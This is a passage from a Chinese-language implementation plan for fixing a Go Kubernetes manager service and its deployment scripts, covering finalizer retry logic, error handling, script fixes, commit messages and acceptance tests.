**Step 2: 运行测试验证当前行为**

```bash
cd manager-service && go test ./internal/k8s/... -v -run TestRemoveFinalizer
# 预期: 查看当前是否有重试逻辑
```

**Step 3: 添加重试逻辑**

```go
// manager-service/internal/k8s/finalizer.go

const (
    // MaxRemoveFinalizerRetries 最大重试次数
    MaxRemoveFinalizerRetries = 3
    // RemoveFinalizerRetryDelay 重试延迟
    RemoveFinalizerRetryDelay = 500 * time.Millisecond
)

// RemoveFinalizer 从 pod 中移除最终处理程序（带重试）
func (c *Client) RemoveFinalizer(ctx context.Context, namespace, podName, finalizer string) error {
    var lastErr error

    for attempt := 0; attempt < MaxRemoveFinalizerRetries; attempt++ {
        if attempt > 0 {
            log.Printf("Retry %d/%d: removing finalizer %s from pod %s",
                attempt, MaxRemoveFinalizerRetries, finalizer, podName)
            time.Sleep(RemoveFinalizerRetryDelay)
        }

        // 获取 pod
        pod, err := c.client.CoreV1().Pods(namespace).Get(ctx, podName, metav1.GetOptions{})
        if err != nil {
            lastErr = fmt.Errorf("failed to get pod: %w", err)
            continue
        }

        // 移除最终处理程序
        finalizers := make([]string, 0, len(pod.Finalizers))
        found := false
        for _, f := range pod.Finalizers {
            if f == finalizer {
                found = true
                continue
            }
            finalizers = append(finalizers, f)
        }

        if !found {
            // 最终处理程序不存在，视为成功
            return nil
        }

        pod.Finalizers = finalizers

        // 更新 pod（使用 ResourceVersion 防止冲突）
        pod, err = c.client.CoreV1().Pods(namespace).Update(ctx, pod, metav1.UpdateOptions{})
        if err != nil {
            lastErr = fmt.Errorf("failed to update pod: %w", err)

            // 检查是否是冲突错误
            if status.IsConflict(err) {
                // 冲突错误 - 重试
                continue
            }

            // 其他错误 - 不重试
            return lastErr
        }

        // 成功
        log.Printf("Removed finalizer %s from pod %s", finalizer, podName)
        return nil
    }

    return fmt.Errorf("failed to remove finalizer after %d attempts: %w",
        MaxRemoveFinalizerRetries, lastErr)
}
```

**Step 4: 运行测试验证通过**

```bash
cd manager-service && go test ./internal/k8s/... -v -run TestRemoveFinalizer
# 预期: PASS
```

**Step 5: Commit**

```bash
git add manager-service/internal/k8s/finalizer.go manager-service/internal/k8s/finalizer_test.go
git commit -m "fix(finalizer): add retry logic to RemoveFinalizer

- Retries up to 3 times on transient errors
- Handles conflict errors by retrying
- Uses ResourceVersion to prevent update conflicts
- Fixes finalizer removal issue 3.4, 3.6, 3.7 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 3.4: 错误处理改进

**问题:** 多处关键错误被静默忽略

**文件:**
- Modify: `manager-service/internal/websocket/handler.go` (SnapshotExists error)
- Modify: `manager-service/internal/httpapi/handlers.go` (PatchActivity error)

**Step 1: 修复 SnapshotExists 错误处理**

```go
// manager-service/internal/websocket/handler.go

func (h *Handler) handleCreate(wsConn *websocket.Conn, createMsg Message) {
    // ... 参数解析 ...

    // 检查快照是否存在
    snapshotKey := h.storageClient.GenerateSnapshotKey(workspaceID, projectID, agentThreadID)

    // 修改前: exists, _ := h.storageClient.SnapshotExists(ctx, snapshotKey)
    // 修改后:
    exists, err := h.storageClient.SnapshotExists(ctx, snapshotKey)
    if err != nil {
        log.Printf("Error checking snapshot existence: %v", err)
        h.sendError(wsConn, fmt.Sprintf("Failed to check snapshot: %v", err))
        return
    }

    if exists {
        // 恢复快照
        if err := h.k8sClient.RestoreWorkspace(ctx, h.namespace, podName, snapshotKey); err != nil {
            log.Printf("Error restoring workspace: %v", err)
            h.sendError(wsConn, fmt.Sprintf("Failed to restore workspace: %v", err))
            return
        }
    }

    // ... 继续会话创建 ...
}
```

**Step 2: 修复 PatchActivity 错误处理**

```go
// manager-service/internal/httpapi/handlers.go

func (h *Handlers) HandleSomeOperation(w http.ResponseWriter, r *http.Request) {
    // ... 处理逻辑 ...

    // 修改前: h.patchActivity(...) // 错误被忽略
    // 修改后:
    if err := h.PatchActivity(r.Context(), namespace, podName); err != nil {
        log.Printf("Warning: failed to update activity timestamp for pod %s: %v", podName, err)
        // 不返回错误，因为主要操作已成功
        // 但记录警告以便监控
    }

    // ... 继续响应 ...
}
```

**Step 3: 运行测试**

```bash
cd manager-service && go test ./internal/... -v
# 预期: 所有测试通过
```

**Step 4: Commit**

```bash
git add manager-service/internal/websocket/handler.go manager-service/internal/httpapi/handlers.go
git commit -m "fix(errors): improve error handling for critical operations

- SnapshotExists errors now properly handled in session creation
- PatchActivity errors logged instead of silently ignored
- Fixes error handling issues 3.9, 3.14 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

## Phase 4: 脚本错误修复

### Task 4.1: offline.sh 未定义变量修复

**问题:** 引用未定义的 `$local_gc`, `$gc_ver`, `$tar_gc`

**文件:**
- Modify: `scripts/lib/offline.sh`

**Step 1: 查找未定义变量的使用位置**

```bash
grep -n "local_gc\|gc_ver\|tar_gc" scripts/lib/offline.sh
# 预期: 找到使用位置
```

**Step 2: 添加变量定义或移除未使用变量**

```bash
# scripts/lib/offline.sh

# 方案 A: 添加变量定义
# 在文件开头或函数开头添加
local_gc="go"
gc_ver="1.21"
tar_gc="tar"

# 方案 B: 如果这些变量确实不需要，移除引用
# 修改相应的代码行，移除对这些变量的引用
```

**Step 3: 运行脚本测试**

```bash
bash -n scripts/lib/offline.sh  # 语法检查
# 预期: 无语法错误

# 如果有集成测试，运行
./scripts/offline.sh --help  # 或其他测试命令
```

**Step 4: Commit**

```bash
git add scripts/lib/offline.sh
git commit -m "fix(scripts): define undefined variables in offline.sh

- Add definitions for local_gc, gc_ver, tar_gc
- Fixes script issue 4.1, 4.6 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

### Task 4.2: 其他脚本错误处理改进

**文件:**
- Modify: `k8s/scripts/rollback.sh`
- Modify: `scripts/smoke-test.sh`
- Modify: `k8s/scripts/deploy.sh`
- Modify: `k8s/scripts/setup-harbor-secret.sh`

**Step 1: 添加错误处理到 rollback.sh**

```bash
# k8s/scripts/rollback.sh

# 修改前
kubectl get configmaps -n "$NAMESPACE" -o name

# 修改后
if ! kubectl get configmaps -n "$NAMESPACE" -o name; then
    echo "Error: failed to get configmaps in namespace $NAMESPACE"
    exit 1
fi
```

**Step 2: 改进 smoke-test.sh 清理逻辑**

```bash
# scripts/smoke-test.sh

# 修改清理函数
cleanup() {
    local pid_file="/tmp/sandbox-pf.pid"

    if [[ -f "$pid_file" ]]; then
        local pid=$(cat "$pid_file")
        # 验证 PID 是数字
        if [[ "$pid" =~ ^[0-9]+$ ]]; then
            if kill -0 "$pid" 2>/dev/null; then
                kill "$pid" 2>/dev/null || true
            fi
        fi
        rm -f "$pid_file"
    fi

    # 额外清理: 杀死可能遗留的端口转发
    pkill -f "port-forward" 2>/dev/null || true
}
```

**Step 3: 添加 deploy.sh 错误传播**

```bash
# k8s/scripts/deploy.sh

# 修改前
kubectl apply -f "$MANIFEST_FILE"

# 修改后
if ! kubectl apply -f "$MANIFEST_FILE"; then
    echo "Error: failed to apply manifest $MANIFEST_FILE"
    exit 1
fi
```

**Step 4: 添加 setup-harbor-secret.sh 验证**

```bash
# k8s/scripts/setup-harbor-secret.sh

read -sp "Enter Harbor password: " harbor_password
echo

# 验证密码非空
if [[ -z "$harbor_password" ]]; then
    echo "Error: Harbor password cannot be empty"
    exit 1
fi
```

**Step 5: 测试所有脚本**

```bash
bash -n k8s/scripts/rollback.sh
bash -n scripts/smoke-test.sh
bash -n k8s/scripts/deploy.sh
bash -n k8s/scripts/setup-harbor-secret.sh
# 预期: 无语法错误
```

**Step 6: Commit**

```bash
git add k8s/scripts/rollback.sh scripts/smoke-test.sh k8s/scripts/deploy.sh k8s/scripts/setup-harbor-secret.sh
git commit -m "fix(scripts): improve error handling in deployment scripts

- Add error checking to rollback.sh
- Improve cleanup logic in smoke-test.sh
- Add validation to setup-harbor-secret.sh
- Fixes script issues 4.2, 4.3, 4.4, 4.5, 4.7 from closing review

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>"
```

---

## 验收测试

### 验收步骤

**Step 1: 运行所有单元测试**

```bash
cd manager-service
go test ./... -v -race
# 预期: 全部 PASS
```

**Step 2: 运行集成测试**

```bash
cd manager-service
go test ./integration/... -v
# 预期: 全部 PASS
```

**Step 3: 运行冒烟测试**

```bash
./scripts/smoke-test.sh
# 预期: 全部 PASS
```

**Step 4: 检查 Goroutine 泄漏**

```bash
# 启动服务
SERVICE_KEYS="test-key" ./manager-service/manager &
PID=$!

# 记录初始 goroutine 数量
INITIAL_GOROUTINES=$(curl -s http://localhost:8080/metrics | grep goroutines)

# 模拟负载: 创建和销毁多个会话
# ... 测试脚本 ...

# 等待一段时间
sleep 30

# 检查 goroutine 数量是否稳定
FINAL_GOROUTINES=$(curl -s http://localhost:8080/metrics | grep goroutines)

# 清理
kill $PID

# 验证: goroutine 数量应该稳定，不应该持续增长
```

**Step 5: 检查内存泄漏**

```bash
# 使用 pprof 或内存监控工具
# 运行压力测试并监控内存使用
```

**Step 6: 验证认证**

```bash
# 测试无 Service Key 启动失败
SERVICE_KEYS="" ./manager-service/manager
# 预期: 退出并显示错误

# 测试 WebSocket 无 key 拒绝连接
wscat -c "ws://localhost:8080/ws"
# 预期: 连接被拒绝

# 测试有效 key 连接成功
wscat -c "ws://localhost:8080/ws?service_key=test-key"
# 预期: 连接成功
```

---

## 验收标准清单

- [ ] 所有单元测试通过 (`go test ./... -v -race`)
- [ ] 集成测试通过 (`go test ./integration/... -v`)
- [ ] 冒烟测试通过 (`./scripts/smoke-test.sh`)
- [ ] 无内存泄漏（压力测试验证）
- [ ] 无 goroutine 泄漏（goroutine 数量稳定）
- [ ] 服务启动时 `SERVICE_KEYS` 为空会失败
- [ ] WebSocket 连接必须提供有效 service key
- [ ] `/debug/config` 不暴露敏感凭据
- [ ] 最终处理程序支持优雅关闭
- [ ] 会话和缓冲区在断开连接时正确清理

---

## 附录: 文件修改清单

| 文件 | 修改类型 | Task |
|------|----------|------|
| `manager-service/internal/auth/servicekey.go` | 修改 | 1.1 |
| `manager-service/internal/app/app.go` | 修改 | 1.2, 1.3, 2.3, 2.4 |
| `manager-service/internal/exec/wrapper.go` | 修改 | 1.4 |
| `manager-service/internal/k8s/snapshot.go` | 修改 | 2.1 |
| `manager-service/internal/files/tar.go` | 修改 | 2.2 |
| `manager-service/internal/session/manager.go` | 修改 | 2.4, 3.2 |
| `manager-service/internal/buffer/manager.go` | 修改 | 2.4 |
| `manager-service/internal/websocket/handler.go` | 修改 | 1.2, 2.4, 3.4 |
| `manager-service/internal/storage/client.go` | 修改 | 3.1 |
| `manager-service/internal/k8s/finalizer.go` | 修改 | 3.3 |
| `manager-service/internal/httpapi/handlers.go` | 修改 | 3.4 |
| `scripts/lib/offline.sh` | 修改 | 4.1 |
| `k8s/scripts/rollback.sh` | 修改 | 4.2 |
| `scripts/smoke-test.sh` | 修改 | 4.3 |
| `k8s/scripts/deploy.sh` | 修改 | 4.4 |
| `k8s/scripts/setup-harbor-secret.sh` | 修改 | 4.5 |

---

**计划版本**: 1.0
**创建日期**: 2025-02-06
**预计工时**: 8-12 小时
**风险等级**: 中等（Context 传播变更需要充分测试）
